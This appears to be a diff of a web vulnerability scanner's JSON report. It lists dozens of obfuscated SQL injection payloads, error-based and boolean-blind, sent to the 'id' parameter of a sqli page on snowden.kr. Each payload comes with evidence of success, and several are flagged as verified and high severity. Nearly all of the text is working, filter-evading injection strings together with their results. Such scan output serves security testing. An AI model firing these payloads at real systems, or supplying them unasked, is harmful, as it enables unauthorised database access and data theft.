@@ -1,6 +1,6 @@
 {
   "metadata": {
-    "scan_time": "2026-04-28 16:42:38",
+    "scan_time": "2026-04-28 17:06:46",
     "summary": {
       "queued": 12024,
       "completed": 12024,
@@ -24,161 +24,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.1927,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "%'/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/'vun%'='vun",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.062,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "%'/**/aNd/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/'vun%'='vun",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0588,
-        "analysis_details": [
-          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "%'/**/aNd/**/cAsE/**/wHeN/**/1=1/**/THEN/**/1/**/ELSE/**/JSON(x'76756e')/**/END/**/aNd/**/'vun%'='vun",
-        "type": "SQLi-boolean_blind",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0723,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "%'/**/aNd/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/'vun%'='vun",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0633,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "%'/**/oR/**/cAsE/**/wHeN/**/1=1/**/THEN/**/1/**/ELSE/**/JSON(x'76756e')/**/END/**/aNd/**/'vun%'='vun",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.2459,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "%'/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/'vun%'='vun",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.2459,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "%'/**/oR/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/'vun%'='vun",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.2459,
+        "response_time": 0.0778,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -200,7 +46,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.2472,
+        "response_time": 0.0205,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -215,16 +61,104 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "%'/**/oR/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/'vun%'='vun",
+        "payload_value": "%'/**/aNd/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/'vun%'='vun",
         "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.028,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%'/**/aNd/**/cAsE/**/wHeN/**/1=1/**/THEN/**/1/**/ELSE/**/JSON(x'76756e')/**/END/**/aNd/**/'vun%'='vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0654,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%'/**/aNd/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0651,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%'/**/oR/**/cAsE/**/wHeN/**/1=1/**/THEN/**/1/**/ELSE/**/JSON(x'76756e')/**/END/**/aNd/**/'vun%'='vun",
+        "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.2458,
+        "response_time": 0.0633,
         "analysis_details": [
-          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%'/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0652,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
         "error_log": null
       }
@@ -244,10 +178,76 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0691,
+        "response_time": 0.0654,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%'/**/oR/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1062,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%'/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1185,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "%'/**/oR/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/'vun%'='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1145,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
         "error_log": null
       }
@@ -267,7 +267,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.2458,
+        "response_time": 0.1179,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -290,32 +290,10 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0569,
+        "response_time": 0.0246,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/aNd/**/1=(sElEcT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62)))/**/FROM/**/DUAL)/**/aNd/**/CHR(118)||CHR(117)||CHR(110)/**/LIKE/**/'vun",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.1257,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
         "error_log": null
       }
@@ -335,7 +313,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.1256,
+        "response_time": 0.0424,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -357,7 +335,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.1256,
+        "response_time": 0.0424,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -372,36 +350,14 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/aNd/**/cAsE/**/wHeN/**/1=1/**/THEN/**/1/**/ELSE/**/JSON(x'76756e')/**/END/**/aNd/**/x'76756e'='vun",
-        "type": "SQLi-boolean_blind",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0228,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/0x76756e/**/LIKE/**/'vun",
+        "payload_value": "'/**/aNd/**/1=(sElEcT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62)))/**/FROM/**/DUAL)/**/aNd/**/CHR(118)||CHR(117)||CHR(110)/**/LIKE/**/'vun",
         "type": "SQLi-error_based",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0268,
+        "response_time": 0.0712,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -423,7 +379,29 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0319,
+        "response_time": 0.0287,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/aNd/**/cAsE/**/wHeN/**/1=1/**/THEN/**/1/**/ELSE/**/JSON(x'76756e')/**/END/**/aNd/**/x'76756e'='vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0403,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -445,7 +423,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0448,
+        "response_time": 0.0514,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -467,7 +445,51 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0733,
+        "response_time": 0.0799,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/0x76756e/**/LIKE/**/'vun",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0966,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/oR/**/'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0967,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -489,7 +511,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0733,
+        "response_time": 0.097,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -511,7 +533,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0734,
+        "response_time": 0.097,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -526,17 +548,16 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/aNd/**/EXTRACTVALUE(1,cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0x3A/**/END)/**/aNd/**/0x76756e='vun",
-        "type": "SQLi-boolean_blind",
+        "payload_value": "'/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/0x76756e='vun",
+        "type": "SQLi-error_based",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.072,
+        "response_time": 0.0969,
         "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Logic Swapping (True!=False)"
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
         "error_log": null
       }
@@ -556,7 +577,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0737,
+        "response_time": 0.0973,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -579,7 +600,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0575,
+        "response_time": 0.0605,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -595,60 +616,17 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/0x76756e='vun",
-        "type": "SQLi-error_based",
+        "payload_value": "'/**/aNd/**/EXTRACTVALUE(1,cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0x3A/**/END)/**/aNd/**/0x76756e='vun",
+        "type": "SQLi-boolean_blind",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0826,
+        "response_time": 0.0801,
         "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/oR/**/'vun1'='vun2",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0829,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/aNd/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/oR/**/'vun1'='vun2",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0155,
-        "analysis_details": [
-          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
       }
@@ -668,7 +646,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0383,
+        "response_time": 0.0157,
         "analysis_details": [
           "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
         ],
@@ -690,7 +668,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0831,
+        "response_time": 0.0175,
         "analysis_details": [
           "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
         ],
@@ -705,14 +683,59 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/aNd/**/0x76756e='vun",
+        "payload_value": "'/**/aNd/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/oR/**/'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0219,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/oR/**/'vun1'='vun2",
         "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0368,
+        "response_time": 0.0108,
+        "analysis_details": [
+          "[Boolean] Content length changed by 4471 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.034,
         "analysis_details": [
           "[Boolean] Content length changed by 4471 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -735,7 +758,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0183,
+        "response_time": 0.0493,
         "analysis_details": [
           "[Boolean] Content length changed by 1603 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -751,16 +774,16 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
-        "type": "SQLi-error_based",
+        "payload_value": "'/**/oR/**/1=(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/(sElEcT/**/1/**/uNiOn/**/sElEcT/**/2)/**/END))/**/aNd/**/'v'/**/+/**/'u'/**/+/**/'n'='vun",
+        "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0349,
+        "response_time": 0.0374,
         "analysis_details": [
-          "[Boolean] Content length changed by 4471 bytes",
+          "[Boolean] Content length changed by 1028 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -774,14 +797,14 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/oR/**/'vun1'='vun2",
+        "payload_value": "'/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/aNd/**/0x76756e='vun",
         "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0401,
+        "response_time": 0.0741,
         "analysis_details": [
           "[Boolean] Content length changed by 4471 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -804,32 +827,9 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0583,
+        "response_time": 0.0324,
         "analysis_details": [
           "[Boolean] Content length changed by 1708 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/1=(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/(sElEcT/**/1/**/uNiOn/**/sElEcT/**/2)/**/END))/**/aNd/**/'v'/**/+/**/'u'/**/+/**/'n'='vun",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0788,
-        "analysis_details": [
-          "[Boolean] Content length changed by 1028 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -850,29 +850,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0131,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
